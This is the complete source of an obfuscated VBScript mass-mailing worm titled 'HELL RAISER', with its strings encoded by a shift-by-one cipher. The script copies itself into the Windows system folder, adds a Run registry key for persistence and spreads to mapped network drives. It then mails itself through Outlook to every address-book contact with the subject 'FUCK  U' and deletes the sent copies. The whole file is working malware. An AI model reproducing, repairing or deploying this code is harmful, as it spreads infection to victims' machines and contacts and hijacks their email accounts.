' HELL RAISER

On Error Resume Next

Dim WTC3
Dim YOQK
Dim A35
Dim BOYYN9P
Dim FLJQ
Dim U82PU
Dim A97P
Dim KIY
Dim B0PU
Dim EMT

Set WTC3 = CreateObject( H8O( "Tdsjqujoh/GjmfTztufnPckfdu" ) )
WTC3.CopyFile WScript.ScriptFullName, WTC3.BuildPath( WTC3.GetSpecialFolder(1), H8O( "SMWQ/WCT" ) )

Set YOQK = CreateObject( H8O( "XTdsjqu/Tifmm" ) )
YOQK.RegWrite H8O( "ILFZ`MPDBM`NBDIJOF]Tpguxbsf]Njdsptpgu]Xjoepxt]DvssfouWfstjpo]Svo]" ) & H8O( "SMWQ" ), WTC3.BuildPath( WTC3.GetSpecialFolder(1), H8O( "SMWQ/WCT" ) )


Set A35 = CreateObject( H8O( "XTdsjqu/Ofuxpsl" ) )
Set FLJQ = A35.EnumNetworkDrives

If FLJQ.Count <> 0 Then
   For BOYYN9P = 0 To FLJQ.Count - 1
       If InStr( FLJQ.Item( BOYYN9P), H8O( "]" ) ) <> 0 Then
          WTC3.CopyFile WScript.ScriptFullName, WTC3.BuildPath( FLJQ.Item( BOYYN9P), H8O( "SMWQ/WCT" ) ) 
       End If
   Next
End If

BOYYN9P = YOQK.RegRead( H8O( "ILFZ`MPDBM`NBDIJOF]" ) & H8O( "SMWQ" ) )

If BOYYN9P = "" Or BOYYN9P > 20 Then
   BOYYN9P = 0
End If

If BOYYN9P = 0 Then
   Set KIY = CreateObject( H8O( "Pvumppl/Bqqmjdbujpo" ) )
   Set U82PU = KIY.GetNameSpace( H8O( "NBQJ" ) )

   For Each A97P In U82PU.AddressLists
       Set FLJQ = KIY.CreateItem( 0 )

       For B0PU = 1 To A97P.AddressEntries.Count
           Set EMT = A97P.AddressEntries( B0PU )

           If B0PU = 1 Then
              FLJQ.BCC = EMT.Address
           Else
              FLJQ.BCC = FLJQ.BCC & H8O( "<!" ) & EMT.Address
           End If
       Next

       FLJQ.Subject = H8O( "GVDL!!V" )
       FLJQ.Body = H8O( "VOMVDLZ" )
       FLJQ.Attachmets.Add WScript.ScriptFullName
       FLJQ.DeleteAfterSubmit = True
       FLJQ.Send
   Next

   BOYYN9P = 0
End If

YOQK.RegWrite H8O( "ILFZ`MPDBM`NBDIJOF]" ) & H8O( "SMWQ" ), BOYYN9P + 1

Function H8O( XOP2 )
   Dim SBL7U
   Dim UAMGZU
   Dim PS80M

   SBL7U = ""

   For UAMGZU = 1 To Len( XOP2 )
       PS80M = Mid( XOP2, UAMGZU, 1 )

       SBL7U = SBL7U & Chr( Asc( PS80M ) - 1 )
   Next

   H8O = SBL7U
End Function
